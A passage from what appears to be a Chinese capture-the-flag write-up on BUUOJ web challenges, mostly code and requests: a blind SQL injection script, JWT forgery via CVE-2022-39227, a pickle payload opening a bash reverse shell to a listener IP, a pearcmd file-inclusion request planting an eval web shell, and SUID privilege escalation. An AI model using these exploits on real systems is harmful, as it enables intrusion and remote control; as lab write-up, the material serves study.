</span></span><span class=line><span class=cl>    <span class=n>lo</span><span class=p>,</span> <span class=n>hi</span> <span class=o>=</span> <span class=mi>32</span><span class=p>,</span> <span class=mi>126</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>lo</span> <span class=o>&lt;</span> <span class=n>hi</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mid</span> <span class=o>=</span> <span class=p>(</span><span class=n>lo</span> <span class=o>+</span> <span class=n>hi</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=n>tpl</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>i</span><span class=o>=</span><span class=n>i</span><span class=p>,</span> <span class=n>mid</span><span class=o>=</span><span class=n>mid</span><span class=p>,</span> <span class=n>SLEEP</span><span class=o>=</span><span class=n>SLEEP</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>t0</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>sess</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=sa>f</span><span class=s2>&#34;name=</span><span class=si>{</span><span class=n>payload</span><span class=si>}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>8</span><span class=p>,</span> <span class=n>proxies</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;http&#34;</span><span class=p>:</span> <span class=kc>None</span><span class=p>,</span> <span class=s2>&#34;https&#34;</span><span class=p>:</span> <span class=kc>None</span><span class=p>})</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>exceptions</span><span class=o>.</span><span class=n>ReadTimeout</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>lo</span> <span class=o>=</span> <span class=n>mid</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>dt</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>t0</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>dt</span> <span class=o>&gt;=</span> <span class=n>TH</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>lo</span> <span class=o>=</span> <span class=n>mid</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>hi</span> <span class=o>=</span> <span class=n>mid</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>lo</span> <span class=o>==</span> <span class=mi>32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=n>res</span> <span class=o>+=</span> <span class=nb>chr</span><span class=p>(</span><span class=n>lo</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>res</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=yes-pickle>Ye&rsquo;s Pickle</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>jwcrypto.jwk</span> <span class=k>as</span> <span class=nn>jwk</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pickle</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>python_jwt</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_random_string</span><span class=p>(</span><span class=n>length</span><span class=o>=</span><span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>characters</span> <span class=o>=</span> <span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span>  <span class=c1># 包含字母和数字</span>
</span></span><span class=line><span class=cl>    <span class=n>random_string</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>characters</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>length</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>random_string</span>
</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s1>&#39;SECRET_KEY&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>generate_random_string</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=n>jwk</span><span class=o>.</span><span class=n>JWK</span><span class=o>.</span><span class=n>generate</span><span class=p>(</span><span class=n>kty</span><span class=o>=</span><span class=s1>&#39;RSA&#39;</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mi>2048</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span><span class=o>=</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;token&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>payload</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>token</span><span class=o>=</span><span class=n>verify_jwt</span><span class=p>(</span><span class=n>payload</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;PS256&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>session</span><span class=p>[</span><span class=s2>&#34;role&#34;</span><span class=p>]</span><span class=o>=</span><span class=n>token</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=s1>&#39;role&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>session</span><span class=p>[</span><span class=s2>&#34;role&#34;</span><span class=p>]</span><span class=o>=</span><span class=s2>&#34;guest&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>user</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;username&#34;</span><span class=p>:</span><span class=s2>&#34;boogipop&#34;</span><span class=p>,</span><span class=s2>&#34;role&#34;</span><span class=p>:</span><span class=s2>&#34;guest&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>jwt</span> <span class=o>=</span> <span class=n>generate_jwt</span><span class=p>(</span><span class=n>user</span><span class=p>,</span> <span class=n>key</span><span class=p>,</span> <span class=s1>&#39;PS256&#39;</span><span class=p>,</span> <span class=n>timedelta</span><span class=p>(</span><span class=n>minutes</span><span class=o>=</span><span class=mi>60</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;index.html&#39;</span><span class=p>,</span><span class=n>token</span><span class=o>=</span><span class=n>jwt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/pickle&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>unser</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>session</span><span class=p>[</span><span class=s2>&#34;role&#34;</span><span class=p>]</span><span class=o>==</span><span class=s2>&#34;admin&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>pickle</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;pickle&#34;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>用<strong>CVE-2022-39227</strong>伪造JWT，然后再进行pickle反序列化，反弹shell即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>json</span> <span class=kn>import</span> <span class=n>loads</span><span class=p>,</span> <span class=n>dumps</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>jwcrypto.common</span> <span class=kn>import</span> <span class=n>base64url_decode</span><span class=p>,</span> <span class=n>base64url_encode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>topic</span><span class=p>(</span><span class=n>topic</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34; Use mix of JSON and compact format to insert forged claims including long expiration &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=n>header</span><span class=p>,</span> <span class=n>payload</span><span class=p>,</span> <span class=n>signature</span><span class=p>]</span> <span class=o>=</span> <span class=n>topic</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>parsed_payload</span> <span class=o>=</span> <span class=n>loads</span><span class=p>(</span><span class=n>base64url_decode</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>parsed_payload</span><span class=p>[</span><span class=s1>&#39;role&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;admin&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>fake_payload</span> <span class=o>=</span> <span class=n>base64url_encode</span><span class=p>((</span><span class=n>dumps</span><span class=p>(</span><span class=n>parsed_payload</span><span class=p>,</span> <span class=n>separators</span><span class=o>=</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>,</span> <span class=s1>&#39;:&#39;</span><span class=p>))))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s1>&#39;{&#34;  &#39;</span> <span class=o>+</span> <span class=n>header</span> <span class=o>+</span> <span class=s1>&#39;.&#39;</span> <span class=o>+</span> <span class=n>fake_payload</span> <span class=o>+</span> <span class=s1>&#39;.&#34;:&#34;&#34;,&#34;protected&#34;:&#34;&#39;</span> <span class=o>+</span> <span class=n>header</span> <span class=o>+</span> <span class=s1>&#39;&#34;, &#34;payload&#34;:&#34;&#39;</span> <span class=o>+</span> <span class=n>payload</span> <span class=o>+</span> <span class=s1>&#39;&#34;,&#34;signature&#34;:&#34;&#39;</span> <span class=o>+</span> <span class=n>signature</span> <span class=o>+</span> <span class=s1>&#39;&#34;}&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>originaltoken</span> <span class=o>=</span> <span class=s1>&#39;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTQ3NDA1OTYsImlhdCI6MTc1NDczNjk5NiwianRpIjoiWVo0bVRoNUp3YkJOLVo5ZGtuQmVWUSIsIm5iZiI6MTc1NDczNjk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.bYfPO-i3FyBWKqt7Gv1utivA-3LvYZb9cPPZtrj4YAp-rXnAFLe9lOx2Uzj7kBr2TOM-kjBi4omYezR-xbPlmieN9vcT4zkoVpyNirJSckcoyZH9oUxJPl4ASZgBNtbtQdTnOgqyRULRF6RAk8HOXT-U9mVO437OMg85L_U2dxSVveZRsQ8xDxDIS0rAG0AaHzpmKr_MPYOBzVQBoYcsofwlEnZGiYq30A1fDncd4lf0entWrOiSeYhR5uSZ-cYWXfpSRR0ALmflA47ea0kJpfHzVxrGc0kLOiPgetSReAmExyVxS3bc5MqUSXzUUiDfcNla-rYX1lhBybsAR84Pdg&#39;</span>
</span></span><span class=line><span class=cl><span class=n>topic</span> <span class=o>=</span> <span class=n>topic</span><span class=p>(</span><span class=n>originaltoken</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>topic</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/?token=%7B%22++eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTQ3NDA1OTYsImlhdCI6MTc1NDczNjk5NiwianRpIjoiWVo0bVRoNUp3YkJOLVo5ZGtuQmVWUSIsIm5iZiI6MTc1NDczNjk5Niwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.%22%3A%22%22%2C%22protected%22%3A%22eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9%22%2C+%22payload%22%3A%22eyJleHAiOjE3NTQ3NDA1OTYsImlhdCI6MTc1NDczNjk5NiwianRpIjoiWVo0bVRoNUp3YkJOLVo5ZGtuQmVWUSIsIm5iZiI6MTc1NDczNjk5Niwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9%22%2C%22signature%22%3A%22bYfPO-i3FyBWKqt7Gv1utivA-3LvYZb9cPPZtrj4YAp-rXnAFLe9lOx2Uzj7kBr2TOM-kjBi4omYezR-xbPlmieN9vcT4zkoVpyNirJSckcoyZH9oUxJPl4ASZgBNtbtQdTnOgqyRULRF6RAk8HOXT-U9mVO437OMg85L_U2dxSVveZRsQ8xDxDIS0rAG0AaHzpmKr_MPYOBzVQBoYcsofwlEnZGiYq30A1fDncd4lf0entWrOiSeYhR5uSZ-cYWXfpSRR0ALmflA47ea0kJpfHzVxrGc0kLOiPgetSReAmExyVxS3bc5MqUSXzUUiDfcNla-rYX1lhBybsAR84Pdg%22%7D%0A</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>2f979ecd-6523-4667-920b-952d10787cb4.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=eyJyb2xlIjoiZ3Vlc3QifQ.aJcpRw.vYpg4Q0XL9337e8MB6kQKifcm28</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://2f979ecd-6523-4667-920b-952d10787cb4.node5.buuoj.cn:81/</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=n>opcode</span><span class=o>=</span><span class=sa>b</span><span class=s1>&#39;&#39;&#39;cos
</span></span></span><span class=line><span class=cl><span class=s1>system
</span></span></span><span class=line><span class=cl><span class=s1>(S&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.88.15.146/6666 0&gt;&amp;1&#39;&#34;
</span></span></span><span class=line><span class=cl><span class=s1>tR.
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>opcode</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>刚好payload里面有个<code>+</code>，忘记编码了emm</p><h2 id=4-复盘>4-复盘</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=k>require_once</span> <span class=s1>&#39;inc/header.php&#39;</span><span class=p>;</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>&lt;?php require_once &#39;inc/sidebar.php&#39;; ?&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>  &lt;!-- Content Wrapper. Contains page content --&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>  &lt;?php 
</span></span></span><span class=line><span class=cl><span class=err>        if (isset($_GET[&#39;page&#39;])) {
</span></span></span><span class=line><span class=cl><span class=err>          $page =&#39;pages/&#39; .$_GET[&#39;page&#39;].&#39;.php&#39;;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>        }else{
</span></span></span><span class=line><span class=cl><span class=err>          $page = &#39;pages/dashboard.php&#39;;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err>        if (file_exists($page)) {
</span></span></span><span class=line><span class=cl><span class=err>          require_once $page; 
</span></span></span><span class=line><span class=cl><span class=err>        }else{
</span></span></span><span class=line><span class=cl><span class=err>          require_once &#39;pages/error_page.php&#39;;
</span></span></span><span class=line><span class=cl><span class=err>        }
</span></span></span><span class=line><span class=cl><span class=err> ?&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;!-- Control Sidebar --&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;aside class=&#34;control-sidebar control-sidebar-dark&#34;&gt;
</span></span></span><span class=line><span class=cl><span class=err>    &lt;!-- Control sidebar content goes here --&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;/aside&gt;
</span></span></span><span class=line><span class=cl><span class=err>  &lt;!-- /.control-sidebar --&gt;
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err> &lt;?php require_once &#39;inc/footer.php&#39;; ?&gt;
</span></span></span></code></pre></td></tr></table></div></div><p>文件包含，可以打pearcmd</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/index.php?+config-create+/&amp;page=../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[&#39;cmd&#39;]);?&gt;+shell.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>98673582-3f7d-4462-a0c7-83e1528d147c.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://98673582-3f7d-4462-a0c7-83e1528d147c.node5.buuoj.cn:81/login.php</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>PHPSESSID=cq0044fmuc7eqlfr48duuljvl9</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span></code></pre></td></tr></table></div></div><p>权限不够看flag，<code>suid</code>提权</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>find / -user root -perm -4000 -print 2&gt;/dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>gzip -f /flag -t  
</span></span></code></pre></td></tr></table></div></div><h2 id=give-me-your-photo-plz>Give me your photo PLZ</h2><p><a class=link href=https://www.cnblogs.com/unknown404/p/10176272.html target=_blank rel=noopener>https://www.cnblogs.com/unknown404/p/10176272.html</a> apache解析漏洞</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>dd6c1238-82ca-4a3b-b0c3-5aee6d57e2d5.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://dd6c1238-82ca-4a3b-b0c3-5aee6d57e2d5.node5.buuoj.cn:81/</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://dd6c1238-82ca-4a3b-b0c3-5aee6d57e2d5.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>multipart/form-data; boundary=----WebKitFormBoundarylzTW48ByROVxArdw</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>318</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>------WebKitFormBoundarylzTW48ByROVxArdw
